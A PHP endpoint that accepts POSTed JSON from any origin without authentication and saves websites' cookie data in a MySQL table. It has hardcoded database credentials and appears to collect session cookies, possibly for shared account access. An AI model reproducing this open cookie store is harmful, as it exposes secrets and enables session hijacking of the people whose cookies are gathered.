<?php
date_default_timezone_set('Asia/Jakarta');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
// Establish a database connection (replace with your database credentials)
$dbHost = "localhost";
$dbUsername = "ccgnimex";
$dbPassword = "aaaaaaac";
$dbName = "ccgnimex";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword, $dbName);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get the JSON data from the request
$json_data = file_get_contents('php://input');

// Parse the JSON data
$data = json_decode($json_data, true);

if ($data) {
    $website = $data['website'];
    $cookie_data = json_encode($data['cookie_data']);
    $timestamp = date('Y-m-d H:i:s');
    $server = $data['server'];
    $platform = $data['platform'];

    // Check if data for the same website, platform, and server already exists in the database
    $checkSql = "SELECT * FROM cookies WHERE website = ? AND platform = ? AND server = ?";
    $checkStmt = $conn->prepare($checkSql);
    $checkStmt->bind_param('sss', $website, $platform, $server);
    $checkStmt->execute();
    $result = $checkStmt->get_result();

    if ($result->num_rows > 0) {
        // If data for the same website, platform, and server exists, update the data
        $updateSql = "UPDATE cookies SET cookie_data = ?, timestamp = ?, validasi = 1 WHERE website = ? AND platform = ? AND server = ?";
        $updateStmt = $conn->prepare($updateSql);
        $updateStmt->bind_param('sssss', $cookie_data, $timestamp, $website, $platform, $server);

        if ($updateStmt->execute()) {
            echo "Cookies updated in the database for Platform: $platform, Server: $server.";
        } else {
            echo "Error updating cookies: " . $updateStmt->error;
        }

        $updateStmt->close();
    } else {
        // If data for the same website, platform, and server does not exist, insert new data
        $insertSql = "INSERT INTO cookies (website, server, cookie_data, timestamp, platform, validasi) VALUES (?, ?, ?, ?, ?, 1)";
        $insertStmt = $conn->prepare($insertSql);
        $insertStmt->bind_param('sssss', $website, $server, $cookie_data, $timestamp, $platform);

        if ($insertStmt->execute()) {
            echo "Cookies saved to the database for Platform: $platform, Server: $server.";
        } else {
            echo "Error: " . $insertStmt->error;
        }

        $insertStmt->close();
    }
} else {
    echo "Invalid JSON data.";
}

// Close the database connection
$conn->close();
?>
